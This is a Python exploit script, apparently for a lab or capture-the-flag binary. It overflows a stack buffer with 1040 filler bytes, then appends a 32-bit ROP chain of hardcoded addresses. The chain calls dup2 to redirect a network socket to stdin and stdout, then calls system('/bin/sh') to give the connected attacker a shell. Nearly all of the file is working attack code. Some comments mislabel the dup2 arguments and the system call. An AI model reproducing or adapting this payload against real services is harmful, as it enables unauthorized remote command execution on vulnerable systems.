#!/usr/bin/env python

import sys
import struct

# 0x8048b6e: pop edi; pop ebp; ret
pop_pop_ret = 0x8048b6e
# libc : 0xb7f561a9 ("/bin/sh")
bin_sh = 0xb7f561a9
# Symbol "system@plt" is at 0x8048670 in a file compiled without debugging.
system_plt = 0x8048670
# Symbol "dup2@plt" is at 0x80485f0 in a file compiled without debugging.
dup2_plt = 0x80485f0

# Offset from buffer start to function return address is 1040.
payload = 1040*"A"

# Add ROP for dup2(sockfd, 1), i.e. dup2(4, 1):
#  * address of dup2()
#  * return address for dup2(): gadget to pop dup2() arguments (pop_pop_ret)
#  * dup2 arguments: sockfd (4) and standard output (1)
payload += struct.pack("<IIII", dup2_plt, pop_pop_ret, 4, 0)

# Add ROP for dup2(sockfd, 0), i.e. dup2(4, 0):
#  * address of dup2()
#  * return address for dup2(): gadget to pop dup2() arguments (pop_pop_ret)
#  * dup2 arguments: sockfd (4) and standard input (0)
payload += struct.pack("<IIII", dup2_plt, pop_pop_ret, 4, 1)

# Add ROP for system("/bin/sh")
#  * address of dup2()
#  * return address for system(): we don't care, just use zero
#  * system argument: address of "/bin/sh"
payload += struct.pack("<III", system_plt, 0, bin_sh)

sys.stdout.write(payload)
